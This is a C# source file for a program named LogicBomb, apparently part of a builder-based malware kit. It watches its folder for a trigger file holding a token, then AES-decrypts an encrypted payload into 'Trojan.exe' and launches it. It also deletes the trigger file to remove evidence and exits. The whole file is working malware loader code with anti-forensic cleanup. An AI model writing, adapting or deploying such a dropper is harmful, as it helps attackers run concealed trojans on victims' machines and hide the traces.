using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;

namespace LogicBomb
{
    internal class Program
    {
        private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");

        private const string TriggerName = "trigger.flag";
        private const string RequiredToken = "ALLOW_TRIGGER";
        private const string MarkerName = "activated.txt";
        private const string EncryptedBombName = "bomb.encrypted";
        private const string DecryptedTrojanName = "Trojan.exe";

        private const int DebounceMs = 1000;
        private const int FileReadyTimeoutSec = 5;

        // AES encryption keys (will be replaced by Builder)
        private static readonly byte[] AES_KEY = new byte[] { /*{{AES_KEY}}*/ };
        private static readonly byte[] AES_IV = new byte[] { /*{{AES_IV}}*/ };

        private static FileSystemWatcher watcher;
        private static ConcurrentDictionary<string, DateTime> pending = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);
        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static string logFile;

        static void Main(string[] args)
        {
            Console.WriteLine("[LogicBomb] START (AES Encrypted Mode) - Press Ctrl+C to stop");
            Directory.CreateDirectory(ResultDir);
            logFile = Path.Combine(ResultDir, "logicbomb_log.jsonl");

            watcher = new FileSystemWatcher(ExecutableBaseDir)
            {
                NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.CreationTime | NotifyFilters.Size,
                Filter = "*.*",
                IncludeSubdirectories = false,
                EnableRaisingEvents = true
            };

            watcher.Created += (s, e) => Enqueue(e.FullPath, "Created");
            watcher.Changed += (s, e) => Enqueue(e.FullPath, "Changed");
            watcher.Renamed += (s, e) => Enqueue(e.FullPath, "Renamed");

            Console.CancelKeyPress += (s, e) =>
            {
                Console.WriteLine("[LogicBomb] Stopping...");
                e.Cancel = true;
                cts.Cancel();
            };

            var worker = Task.Run(() => ProcessLoop(cts.Token));

            Console.WriteLine($"[LogicBomb] Watching: {ExecutableBaseDir}");
            Console.WriteLine($"[LogicBomb] Waiting for file '{TriggerName}' containing token '{RequiredToken}'");

            try
            {
                worker.Wait();
            }
            finally
            {
                watcher?.Dispose();
                cts?.Dispose();
            }

            Console.WriteLine("[LogicBomb] Exiting.");
        }

        private static void Enqueue(string path, string ev)
        {
            try
            {
                if (string.IsNullOrEmpty(path))
                {
                    LogEvent("error", null, ev, "null or empty path");
                    return;
                }

                if (!string.Equals(Path.GetFileName(path), TriggerName, StringComparison.OrdinalIgnoreCase))
                    return;

                pending[path] = DateTime.UtcNow;
                LogEvent("enqueue", path, ev, null);
                Console.WriteLine($"[LogicBomb] Event {ev} -> enqueue: {path}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[LogicBomb] Enqueue error for {path}: {ex.Message}");
                LogEvent("error", path, "enqueue_failed", ex.Message);
            }
        }

        private static void LogEvent(string type, string path, string ev, string note)
        {
            try
            {
                var obj = new Dictionary<string, string>
                {
                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
                    ["type"] = type ?? "unknown",
                    ["event"] = ev ?? "none",
                    ["path"] = path ?? "null",
                    ["note"] = note ?? "none"
                };
                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";

                // Retry logic for file access conflicts
                int retries = 3;
                while (retries > 0)
                {
                    try
                    {
                        File.AppendAllText(logFile, json + Environment.NewLine);
                        break;
                    }
                    catch (IOException) when (retries > 1)
                    {
                        retries--;
                        Thread.Sleep(50);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[LogicBomb] Logging failed: {ex.Message}");
            }
        }

        private static string Escape(string s)
        {
            return s?.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n") ?? "";
        }

        private static async Task ProcessLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    var now = DateTime.UtcNow;
                    var ready = pending.Where(kv => (now - kv.Value).TotalMilliseconds >= DebounceMs)
                                       .Select(kv => kv.Key)
                                       .ToArray();
                    foreach (var path in ready)
                    {
                        DateTime removed;
                        pending.TryRemove(path, out removed);
                        await Task.Run(() => HandleTrigger(path));
                    }
                    await Task.Delay(300, token);
                }
            }
            catch (TaskCanceledException) { }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] Worker error: " + ex.Message);
            }
        }

        private static void HandleTrigger(string fullPath)
        {
            try
            {
                Console.WriteLine("[LogicBomb] Processing trigger: " + fullPath);
                LogEvent("process_start", fullPath, "processing", null);

                // Validate file path is within expected directory
                string normalizedPath = Path.GetFullPath(fullPath);
                string normalizedBase = Path.GetFullPath(ExecutableBaseDir);
                if (!normalizedPath.StartsWith(normalizedBase, StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("[LogicBomb] Security: Trigger file outside base directory");
                    LogEvent("security", fullPath, "path_traversal_attempt", null);
                    return;
                }

                if (!WaitForFileReady(fullPath, TimeSpan.FromSeconds(FileReadyTimeoutSec)))
                {
                    Console.WriteLine("[LogicBomb] File not ready within timeout: " + fullPath);
                    LogEvent("error", fullPath, "not_ready", "timeout waiting for file ready");
                    return;
                }

                // Check file size to prevent reading huge files
                var fileInfo = new FileInfo(fullPath);
                if (fileInfo.Length > 1024 * 1024) // 1MB limit
                {
                    Console.WriteLine($"[LogicBomb] Trigger file too large: {fileInfo.Length} bytes");
                    LogEvent("error", fullPath, "file_too_large", $"{fileInfo.Length} bytes");
                    return;
                }

                string content = File.ReadAllText(fullPath);

                if (string.IsNullOrEmpty(content) || content.IndexOf(RequiredToken, StringComparison.OrdinalIgnoreCase) < 0)
                {
                    Console.WriteLine("[LogicBomb] Trigger does not contain a valid token. Skipping.");
                    LogEvent("skipped", fullPath, "invalid_token", null);
                    return;
                }

                // Create marker file inside "result"
                string markerPath = Path.Combine(ResultDir, MarkerName);
                File.WriteAllText(markerPath, $"Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                Console.WriteLine("[LogicBomb] Creating marker: " + markerPath);

                // Decrypt and execute encrypted Trojan
                string encryptedBombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                string executableToRun = null;

                if (File.Exists(encryptedBombPath))
                {
                    try
                    {
                        Console.WriteLine($"[LogicBomb] Found encrypted payload: {encryptedBombPath}");

                        // Decrypt Trojan.exe
                        string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
                        DecryptFile(encryptedBombPath, decryptedTrojanPath);

                        Console.WriteLine($"[LogicBomb] Decrypted payload to: {decryptedTrojanPath}");
                        LogEvent("decrypted", encryptedBombPath, "decrypted_to", decryptedTrojanPath);

                        if (File.Exists(decryptedTrojanPath))
                        {
                            executableToRun = decryptedTrojanPath;
                            Console.WriteLine($"[LogicBomb] Trojan.exe ready for execution");
                        }
                        else
                        {
                            Console.WriteLine($"[LogicBomb] Trojan.exe not found after decryption");
                            LogEvent("error", decryptedTrojanPath, "decryption_result_missing", null);
                        }
                    }
                    catch (CryptographicException ex)
                    {
                        Console.WriteLine("[LogicBomb] Decryption failed: " + ex.Message);
                        LogEvent("error", encryptedBombPath, "decrypt_failed", ex.Message);
                        executableToRun = null;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error processing encrypted payload: " + ex.Message);
                        LogEvent("error", encryptedBombPath, "processing_failed", ex.Message);
                        executableToRun = null;
                    }
                }
                else
                {
                    Console.WriteLine($"[LogicBomb] {EncryptedBombName} not found in program directory. Skipping.");
                    LogEvent("info", fullPath, "no_encrypted_bomb", null);
                }

                if (executableToRun != null)
                {
                    Console.WriteLine("[LogicBomb] Launching: " + executableToRun);

                    // Log final state before exit
                    LogEvent("final", executableToRun, "about_to_exit", "payload launched successfully");

                    var psi = new ProcessStartInfo
                    {
                        FileName = executableToRun,
                        WorkingDirectory = ResultDir,
                        UseShellExecute = true,
                        CreateNoWindow = false
                    };

                    try
                    {
                        // Delete trigger file to remove evidence
                        if (File.Exists(fullPath))
                        {
                            File.Delete(fullPath);
                            Console.WriteLine("[LogicBomb] Deleted trigger file");
                        }

                        Process.Start(psi);
                        LogEvent("launched", executableToRun, "launched", null);
                        Console.WriteLine("[LogicBomb] Executable started. Exiting main app.");
                        Environment.Exit(0);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error launching executable: " + ex.Message);
                        LogEvent("error", executableToRun, "launch_failed", ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] HandleTrigger error: " + ex.Message);
                LogEvent("error", fullPath, "handle_error", ex.Message);
            }
        }

        private static void DecryptFile(string inputFile, string outputFile)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = AES_KEY;
                aes.IV = AES_IV;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.CopyTo(fsOutput);
                }
            }
        }

        private static bool WaitForFileReady(string path, TimeSpan timeout)
        {
            if (!File.Exists(path))
            {
                Console.WriteLine($"[LogicBomb] File does not exist: {path}");
                return false;
            }

            var sw = Stopwatch.StartNew();
            while (sw.Elapsed < timeout)
            {
                try
                {
                    using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.None))
                    {
                        if (fs.Length > 0)
                        {
                            Console.WriteLine($"[LogicBomb] File ready: {path} ({fs.Length} bytes)");
                            return true;
                        }
                    }
                }
                catch (IOException)
                {
                    // File still being written
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine($"[LogicBomb] Access denied to file: {path}");
                    return false;
                }

                Thread.Sleep(100);
            }

            Console.WriteLine($"[LogicBomb] Timeout waiting for file: {path}");
            return false;
        }
    }
}